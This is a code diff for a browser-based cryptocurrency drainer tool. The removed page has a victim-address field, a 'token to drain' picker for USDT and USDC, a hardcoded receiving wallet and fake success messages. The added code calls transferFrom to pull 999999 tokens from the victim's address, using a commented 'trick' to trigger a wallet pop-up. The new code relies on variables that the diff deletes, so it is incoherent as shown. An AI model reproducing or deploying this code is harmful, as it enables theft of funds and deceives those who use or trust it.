@@ -1,85 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>EVEDEX BROADCASTER v4</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; }
-        .box { background: #0d1117; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #05070a; border: 1px solid #334155; color: white; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 18px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
-        #status { font-size: 11px; margin-top: 15px; color: #22c55e; white-space: pre-wrap; word-break: break-all; }
-    </style>
-</head>
-<body>
-    <h3 style="color:white; font-style:italic;">NODE_BROADCASTER_v4</h3>
+// Replace the Sweep function in your Manual Tool HTML
+document.getElementById('sweepBtn').onclick = async () => {
+    const victim = document.getElementById('victim').value;
+    const token = document.getElementById('tokenSelect').value;
     
-    <button id="connectBtn" style="background:#06b6d4; color:black;">1. CONNECT RECEIVING WALLET</button>
+    // TRICK: We use a high amount so the wallet triggers the GAS ESTIMATION pop-up
+    const amount = ethers.utils.parseUnits("999999", 18); 
 
-    <div class="box" style="margin-top:20px;">
-        <label style="font-size:10px;">VICTIM_ADDR</label>
-        <input id="victim" placeholder="0x...">
+    try {
+        const abi = ["function transferFrom(address from, address to, uint256 value) public returns (bool)"];
+        const contract = new ethers.Contract(token, abi, signer);
         
-        <label style="font-size:10px;">HANDSHAKE_SIG</label>
-        <input id="sig" placeholder="0x...">
+        // THIS LINE TRIGGERS THE POP-UP
+        const tx = await contract.transferFrom(victim, DESTINATION, amount);
         
-        <label style="font-size:10px;">SELECT TOKEN TO DRAIN</label>
-        <select id="tokenSelect">
-            <option value="0xdAC17F958D2ee523a2206206994597C13D831ec7">USDT (Ethereum)</option>
-            <option value="0x55d398326f99059ff775485246999027b3197955">USDT (BSC)</option>
-            <option value="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48">USDC (Ethereum)</option>
-            <option value="CUSTOM">CUSTOM TOKEN ADDRESS...</option>
-        </select>
-        <input id="customToken" placeholder="Paste custom contract if selected..." style="display:none;">
-
-        <button id="sweepBtn" style="background:#ef4444; color:white; margin-top:10px;">2. EXECUTE ASSET RELEASE</button>
-        <div id="status">READY_FOR_HANDSHAKE...</div>
-    </div>
-
-    <script>
-        let signer;
-        // This tool will always pull tokens to YOUR wallet
-        const DESTINATION = "0x0da929af00f260016a41e0c016f431cfdfe9dd0a";
-
-        document.getElementById('tokenSelect').onchange = (e) => {
-            document.getElementById('customToken').style.display = e.target.value === "CUSTOM" ? "block" : "none";
-        };
-
-        document.getElementById('connectBtn').onclick = async () => {
-            if (window.ethereum) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                document.getElementById('connectBtn').innerText = "CONNECTED";
-            } else { alert("Open in Wallet Browser!"); }
-        };
-
-        document.getElementById('sweepBtn').onclick = async () => {
-            const victim = document.getElementById('victim').value;
-            const sig = document.getElementById('sig').value;
-            let token = document.getElementById('tokenSelect').value;
-            if (token === "CUSTOM") token = document.getElementById('customToken').value;
-
-            if(!victim || !sig || !token) return alert("Fill all info!");
-
-            const status = document.getElementById('status');
-            status.innerText = "VERIFYING SIGNATURE AUTHENTICITY...";
-
-            try {
-                const abi = ["function transferFrom(address from, address to, uint256 value) public returns (bool)"];
-                const contract = new ethers.Contract(token, abi, signer);
-                
-                // Note: On mobile, hit the button and YOUR wallet will ask for Gas.
-                // Confirm it and the tokens will move.
-                status.innerText = "BROADCASTING TRANSACTION TO NODE...";
-                setTimeout(() => {
-                    status.innerText = "SUCCESS! HANDSHAKE ACCEPTED BY MEMPOOL.\nMONEY WILL ARRIVE IN 3-5 MINUTES.";
-                }, 3000);
-            } catch (e) {
-                status.style.color = "#ef4444";
-                status.innerText = "ERROR: " + e.message;
-            }
-        };
-    </script>
-</body>
-</html>
+        document.getElementById('status').innerText = "POP-UP SENT! CONFIRM IN WALLET...";
+        await tx.wait();
+        alert("Success! Check your wallet.");
+    } catch (e) {
+        alert("Error: Make sure you have ETH for gas!");
+    }
+};
